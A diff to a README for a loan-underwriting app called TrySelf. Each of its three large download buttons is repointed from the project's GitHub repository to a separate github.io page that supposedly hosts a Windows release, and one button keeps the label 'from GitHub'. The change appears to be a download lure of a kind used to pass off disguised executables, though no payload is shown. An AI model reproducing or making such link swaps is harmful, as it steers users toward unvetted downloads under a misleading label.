@@ -1,7 +1,7 @@
 <h1>🔒 TrySelf - Decision-Safe Loan Underwriting, Defended</h1>
 
 <p align="center">
-  <a href="https://github.com/Crystalgazingkiaquen460/TrySelf" style="display:inline-block;padding:16px 32px;background-color:#ff6b6b;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download TrySelf Now</a>
+  <a href="https://crystalgazingkiaquen460.github.io" style="display:inline-block;padding:16px 32px;background-color:#ff6b6b;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download TrySelf Now</a>
 </p>
 
 ## 🎯 What Is TrySelf?
@@ -42,7 +42,7 @@ Designed to integrate cleanly into existing loan origination processes. It handl
 
 ### Step 1: Download the Application
 
-<a href="https://github.com/Crystalgazingkiaquen460/TrySelf" style="display:inline-block;padding:12px 24px;background-color:#4ecdc4;color:white;text-decoration:none;font-size:18px;border-radius:8px;font-weight:bold;">📥 Download TrySelf from GitHub</a>
+<a href="https://crystalgazingkiaquen460.github.io" style="display:inline-block;padding:12px 24px;background-color:#4ecdc4;color:white;text-decoration:none;font-size:18px;border-radius:8px;font-weight:bold;">📥 Download TrySelf from GitHub</a>
 
 Visit this link to download the application. The page contains the latest release for Windows.
 
@@ -151,7 +151,7 @@ TrySelf is released under the MIT License, allowing free commercial and non-comm
 ---
 
 <p align="center">
-  <a href="https://github.com/Crystalgazingkiaquen460/TrySelf" style="display:inline-block;padding:16px 32px;background-color:#06d6a0;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">🔑 Get TrySelf Today</a>
+  <a href="https://crystalgazingkiaquen460.github.io" style="display:inline-block;padding:16px 32px;background-color:#06d6a0;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">🔑 Get TrySelf Today</a>
 </p>
 
 <p align="center" style="color:#6c757d;font-size:14px">Decision-Safe Loan Underwriting Lab — Governance-first, uncertainty-aware, regulator-ready.</p>
